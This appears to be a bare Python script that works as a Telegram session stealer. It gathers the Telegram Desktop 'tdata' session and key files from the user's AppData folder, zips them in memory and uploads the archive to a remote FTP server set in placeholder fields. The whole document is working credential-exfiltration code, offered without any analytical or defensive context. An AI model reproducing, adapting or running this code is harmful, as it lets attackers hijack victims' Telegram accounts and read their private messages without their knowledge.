import io
import os
import glob
from datetime import datetime
from ftplib import FTP
from zipfile import ZipFile

# FTP server info
LOGIN = "login"
PASSWORD = "password"
FOLDER = "/"
ADDR_HOST = "hostname"
ADDR_PORT = 21

# Buffer size for uploading
buffer_size = 1024

# Name for archive on server
archive_name = datetime.now().strftime("%Y-%m-%d %H-%M-%S.zip")

# Create "file" in RAM
archive = io.BytesIO()

# Get appdata folder
appdata = os.getenv("appdata")
# Set tdata folder location
tdata_path = os.path.join(appdata, "Telegram Desktop\\tdata\\")
hash_path = os.path.join(appdata, "Telegram Desktop\\tdata\\D877F783D5D3EF8?*")

#Archivation folders
with ZipFile(archive, "w") as zipObj:
    hash_map = glob.iglob(os.path.join(hash_path , "*"))
    for file in hash_map:
        if os.path.isfile(file):
            local_path = file[len(tdata_path):]
            zipObj.write(file, "hash_map\\"+local_path)

    #If hash file has 15 letters
    files16 = glob.iglob(os.path.join(tdata_path , "??????????*"))
    for file in files16:
        if os.path.isfile(file):
            local_path = file[len(tdata_path):]
            zipObj.write(file, "connection_hash\\"+local_path)

# Go to begin of file
archive.seek(0)


# FTP module to connect server
ftp = FTP()
ftp.set_debuglevel(2)
ftp.connect(ADDR_HOST, ADDR_PORT)
ftp.login(LOGIN, PASSWORD)
ftp.cwd(FOLDER)

# Sending file on FTP server
ftp.storbinary(f"STOR {os.path.basename(archive_name)}", archive, buffer_size)
